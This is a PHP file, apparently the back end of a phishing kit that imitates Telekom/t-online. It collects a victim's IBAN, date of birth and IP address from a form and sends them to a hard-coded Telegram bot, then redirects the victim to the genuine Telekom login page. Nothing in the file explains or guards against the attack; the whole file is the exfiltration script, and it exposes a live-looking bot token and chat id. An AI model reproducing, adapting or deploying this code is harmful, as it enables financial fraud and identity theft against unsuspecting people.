<?php

session_start();
if(($_POST['ibn'] != "") AND ($_POST['dob'] != "")   )
{

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message="++++++++++++++++++++ I.B.A.N.  ++++\r\n";

$message .= "MDP	: ".$_POST['ibn']."\n";

$message .= "MDP	: ".$_POST['dob']."\n";

$message.="+++++++++++++($ip);+++++++++++++\r\n";



$token = "7684084954:AAEnEwI6Aj_0keVQOZUfz2wXCg9zEce9FIk";

$data = [
    $message => '',
    'chat_id' => '7494979988'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?&text=$body" . http_build_query($data) );


echo "<script>top.location='https://www.t-online.de/auth/oauth2/authorization/telekom'</script>";
}
	else {
     header("Location: ../Select/index.php");
}

?>